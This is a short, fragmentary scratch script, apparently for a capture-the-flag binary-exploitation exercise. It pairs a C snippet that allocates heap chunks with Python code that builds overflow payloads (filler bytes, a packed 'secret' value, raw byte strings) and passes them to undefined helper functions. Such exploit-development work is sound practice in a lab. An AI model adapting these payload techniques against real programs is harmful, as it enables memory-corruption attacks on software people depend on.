main(){
	malloc(0x20);
	malloc(0x1d0);
}

# func01: padding = 1026
# size = 1024
# payload = b'a'*size*4 
# func1(size, payload)

'''
size = 0x2
name = b"a"*size
func2(size, name)


#func3 padding 0x408
print(func3(20))

size = 0x2
name = b"a"*size
func2(size, name)
'''

''''
secret = 0x000000000000a5a1
size = 2
payload = p64(secret) 
stuff = func1(size, payload)
print("---------")
print(stuff)
print("---------")

# BYTE bytes [] = {0xD7,0x99,0xD7,0x95,0xD7,0x97,0xD7,0x90,0xD7,0x99,0x20,0xD7,0x95,0xD7,0x9B,0xD7,0x98,0xD7,0xA8, 0x00};
# \xea\x96\xa1
secret = b"\xD7\x99\xD7\x95\xD7\x97\xD7\x90\xD7\x99\x20\xD7\x95\xD7\x9B\xD7\x98\xD7\xA8"
secret = b'\x01'*18 + b'\xD7\x99' + b'\x00'


size = len(secret)
#func2(size, secret)

func2(2, b'\xD7\x99')
func3(12)

#func2(size, secret)
'''

size = 2
payload = b'a'*size*4 
func1(size, payload)

#twobyte = b'\xD7\x99'
twobyte = b"\x50\x0e\x42\xf1\x0f\x50\x00"
payload = b'\x01'*6 + twobyte + b'\x01' 
func2(len(twobyte), twobyte)

func3(12)
